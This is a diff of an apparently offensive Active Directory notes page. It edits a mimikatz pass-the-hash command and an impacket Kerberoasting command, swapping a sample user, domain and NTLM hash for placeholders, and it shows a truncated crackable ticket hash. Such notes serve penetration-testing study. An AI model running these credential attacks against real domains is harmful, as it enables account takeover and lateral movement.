@@ -220,7 +220,7 @@ The above pass-the-hash technique works great for protocols like SMB which use t
 
 {% code overflow="wrap" %}
 ```powershell
-sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+sekurlsa::pth /user:$USERNAME /domain:$DOMAIN /ntlm:$NTLM_HASH /run:powershell
 ```
 {% endcode %}
 
@@ -322,14 +322,13 @@ Content           : ...
 
 Every **Service** on AD that requires Kerberos authentication registers a **Service Principal Name** (SPN). This allows clients to request Tickets for the service. The Ticket Granting Ticket (TGT) is encrypted using the **service account's password hash**, which is given to the client. Using this encrypted data, an attacker can brute force the password offline until it successfully decrypts, then knowing the correct password for the service account.
 
-1. Query the AD to identify service accounts with registered SPNs (eg. using [Broken link](broken-reference "mention"))
+1. Query the AD to identify service accounts with registered SPNs
 2. Request a Ticket Granting Service (TGS) ticket for the identified service account using any compromised user. In response, receive the encrypted TGS with the password hash
 3. Attempt to crack the password hash offline, and when found, take over the service account
 
-The first step can be done easily in BloodHound under the **Analysis** tab as **List all Kerberoastable Accounts**. \
-After which, you can use [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) from impacket to request a ticket and receive the crackable password hash.
+The first step can be checked easily in BloodHound under the **Analysis** tab as **List all Kerberoastable Accounts**. After which, you can use [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) from impacket to request a ticket and receive the crackable password hash.
 
-<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ GetUserSPNs.py 'DOMAIN.COM/USER:PASSWORD' -request -outputfile kerberoast.hashes -dc-ip $DC
+<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ GetUserSPNs.py -request -outputfile kerberoast.hashes -dc-ip $DC '$DOMAIN/$USERNAME:$PASSWORD'
 </strong>...
 $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe42230300d56852c9eb$891ad31...b668c5ed
 </code></pre>
